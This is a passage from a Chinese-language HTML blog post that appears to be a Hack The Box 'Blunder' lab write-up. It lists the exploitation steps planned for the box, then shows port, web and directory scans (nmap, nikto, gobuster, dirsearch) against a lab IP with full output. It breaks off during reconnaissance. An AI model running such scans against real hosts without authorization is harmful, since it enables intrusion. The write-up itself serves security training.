@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录扫描、CVE-2019-17240漏洞利用、cewl工具密码生成、CVE-2019-16113漏洞利用、配置文件密码泄露、md5密码破解、sudo 1.8.27漏洞提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Blunder-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/18/Blunder-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录扫描、CVE-2019-17240漏洞利用、cewl工具密码生成、CVE-2019-16113漏洞利用、配置文件密码泄露、md5密码破解、sudo 1.8.27漏洞提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Blunder-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Blunder-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Blunder-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Blunder-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Blunder-htb-writeup/5.png">
+<meta property="article:published_time" content="2023-12-18T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-24T09:46:09.171Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Blunder-htb-writeup/1.png">
+  
+  
+  
+  <title>Blunder-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Blunder-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-18 23:50" pubdate>
+          2023年12月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          237 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Blunder-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录扫描、CVE-2019-17240漏洞利用、cewl工具密码生成、CVE-2019-16113漏洞利用、配置文件密码泄露、md5密码破解、sudo 1.8.27漏洞提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://www.jgeek.cn/article/71</code></p>
+<p>参考链接：<code>https://princerohit8800.medium.com/blunder-e39b2cfda153</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.191</p>
+<p>2、端口扫描下，获取下开放端口信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-et8bwvyzp7]─[~/Desktop]<br>└──╼ [★]$ sudo nmap -sC -sV -p- 10.10.10.191 --min-rate=5000<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 12:33 GMT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.191<br>Host is up (0.13s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT   STATE  SERVICE VERSION<br>21/tcp closed ftp<br>80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-generator: Blunder<br>|_http-title: Blunder | A blunder of interesting facts<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 202.55 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、使用 nikto 工具扫描下80端口的网站服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop]<br>└──╼ [★]$ nikto -h http://10.10.10.191<br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.10.191<br>+ Target Hostname:    10.10.10.191<br>+ Target Port:        80<br>+ Start Time:         2023-12-22 13:47:21 (GMT0)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.41 (Ubuntu)<br>+ Retrieved x-powered-by header: Bludit<br>+ The anti-clickjacking X-Frame-Options header is not present.<br>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>+ The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span><br>+ All CGI directories <span class="hljs-string">&#x27;found&#x27;</span>, use <span class="hljs-string">&#x27;-C none&#x27;</span> to <span class="hljs-built_in">test</span> none<br>+ <span class="hljs-string">&quot;robots.txt&quot;</span> contains 1 entry <span class="hljs-built_in">which</span> should be manually viewed.<br>+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="hljs-literal">false</span> positives.<br>+ /admin/config.php: PHP Config file may contain database IDs and passwords.<br>+ /admin/cplogfile.log: DevBB 1.0 final (http://www.mybboard.com) <span class="hljs-built_in">log</span> file is readable remotely. Upgrade to the latest version.<br>+ /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.<br>+ OSVDB-3233: /admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.<br>+ OSVDB-5034: /admin/login.php?action=insert&amp;username=<span class="hljs-built_in">test</span>&amp;password=<span class="hljs-built_in">test</span>: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> with user <span class="hljs-string">&#x27;test&#x27;</span> password <span class="hljs-string">&#x27;test&#x27;</span> to verify.<br>+ OSVDB-376: /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to <span class="hljs-built_in">let</span> attackers <span class="hljs-built_in">read</span> arbitrary files. Restrict access to /admin.<br>+ OSVDB-2813: /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein<br>+ OSVDB-2922: /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.<br>+ OSVDB-3092: /admin/: This might be interesting...<br>+ OSVDB-3093: /admin/auth.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/cfg/configscreen.inc.php+: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/cfg/configsite.inc.php+: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/cfg/configsql.inc.php+: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/cfg/configtache.inc.php+: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/cms/htmltags.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/credit_card_info.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/exec.php3: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/modules/cache.php+: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/objects.inc.php4: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/script.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/settings.inc.php+: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/templates/header.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-3093: /admin/upload.php: This might be interesting... has been seen <span class="hljs-keyword">in</span> web logs from an unknown scanner.<br>+ OSVDB-4238: /admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected.<br>+ OSVDB-4239: /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected.<br>+ OSVDB-9624: /admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access.<br>+ OSVDB-3092: /install.php: install.php file found.<br>+ /admin/account.asp: Admin login page/section found.<br>+ /admin/account.html: Admin login page/section found.<br>+ /admin/account.php: Admin login page/section found.<br>+ /admin/controlpanel.asp: Admin login page/section found.<br>+ /admin/controlpanel.html: Admin login page/section found.<br>+ /admin/controlpanel.php: Admin login page/section found.<br>+ /admin/cp.asp: Admin login page/section found.<br>+ /admin/cp.html: Admin login page/section found.<br>+ /admin/cp.php: Admin login page/section found.<br>+ /admin/home.asp: Admin login page/section found.<br>+ /admin/home.php: Admin login page/section found.<br>+ /admin/index.asp: Admin login page/section found.<br>+ /admin/index.html: Admin login page/section found.<br>+ /admin/login.asp: Admin login page/section found.<br>+ /admin/login.html: Admin login page/section found.<br>+ /admin/login.php: Admin login page/section found.<br>+ /admin/html: Tomcat Manager / Host Manager interface found (pass protected)<br>+ /admin/status: Tomcat Server Status interface found (pass protected)<br>+ /admin/sites/new: ComfortableMexicanSofa CMS Engine Admin Backend (pass protected)<br>+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.<br>+ 26494 requests: 0 error(s) and 54 item(s) reported on remote host<br>+ End Time:           2023-12-22 13:52:23 (GMT0) (302 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br><br><br>      *********************************************************************<br>      Portions of the server<span class="hljs-string">&#x27;s headers (Apache/2.4.41) are not in</span><br><span class="hljs-string">      the Nikto 2.1.6 database or are newer than the known string. Would you like</span><br><span class="hljs-string">      to submit this information (*no server specific data*) to CIRT.net</span><br><span class="hljs-string">      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? </span><br></code></pre></td></tr></table></figure>
+
+<p>4、使用 gobuster 进行目录扫描下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop]<br>└──╼ [★]$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt <br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.10.191<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2023/12/22 14:12:03 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.hta                 (Status: 403) [Size: 277]<br>/.htaccess            (Status: 403) [Size: 277]<br>/.htpasswd            (Status: 403) [Size: 277]<br>/0                    (Status: 200) [Size: 7562]<br>/about                (Status: 200) [Size: 3281]<br>/admin                (Status: 301) [Size: 0] [--&gt; http://10.10.10.191/admin/]<br>/cgi-bin/             (Status: 301) [Size: 0] [--&gt; http://10.10.10.191/cgi-bin]<br>/LICENSE              (Status: 200) [Size: 1083]                               <br>/robots.txt           (Status: 200) [Size: 22]                                 <br>/server-status        (Status: 403) [Size: 277]                                <br>                                                                               <br>===============================================================<br>2023/12/22 14:12:16 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>5、使用 dirsearch 进行目录扫描下，作为辅助扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop]<br>└──╼ [★]$ git <span class="hljs-built_in">clone</span> https://github.com/maurosoria/dirsearch<br>Cloning into <span class="hljs-string">&#x27;dirsearch&#x27;</span>...<br>remote: Enumerating objects: 11745, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (165/165), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (106/106), <span class="hljs-keyword">done</span>.<br>remote: Total 11745 (delta 86), reused 119 (delta 59), pack-reused 11580<br>Receiving objects: 100% (11745/11745), 21.57 MiB | 27.57 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (7703/7703), <span class="hljs-keyword">done</span>.<br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop]<br>└──╼ [★]$ <span class="hljs-built_in">cd</span> dirsearch/<br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop/dirsearch]<br>└──╼ [★]$ pip3 install -r requirements.txt <br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop/dirsearch]<br>└──╼ [★]$ <span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span>             dirbuster       dirmngr-client  dirsplit<br>dirb            <span class="hljs-built_in">dircolors</span>       <span class="hljs-built_in">dirname</span>         <br>dirb-gendict    dirmngr         <span class="hljs-built_in">dirs</span>            <br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-41ohbzuri8]─[~/Desktop/dirsearch]<br>└──╼ [★]$ python3 ./dirsearch.py -u http://10.10.10.191<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25<br>Wordlist size: 11715<br><br>Output: /home/shiyan/Desktop/dirsearch/reports/http_10.10.10.191/_23-12-22_14-19-30.txt<br><br>Target: http://10.10.10.191/<br><br>[14:19:30] Starting: <br>[14:19:36] 200 -  955B  - 